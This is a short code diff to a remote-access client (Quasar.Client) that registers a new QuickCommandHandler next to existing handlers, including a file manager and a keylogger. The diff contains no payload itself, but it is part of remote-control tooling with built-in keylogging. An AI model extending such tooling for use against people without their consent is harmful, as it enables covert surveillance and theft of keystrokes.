@@ -173,6 +173,8 @@ namespace Quasar.Client
             //preview stuff
             _messageProcessors.Add(new PreviewHandler());
 
+            _messageProcessors.Add(new QuickCommandHandler());
+
             _messageProcessors.Add(new ClientServicesHandler(this, client));
             _messageProcessors.Add(new FileManagerHandler(client));
             _messageProcessors.Add(new KeyloggerHandler());
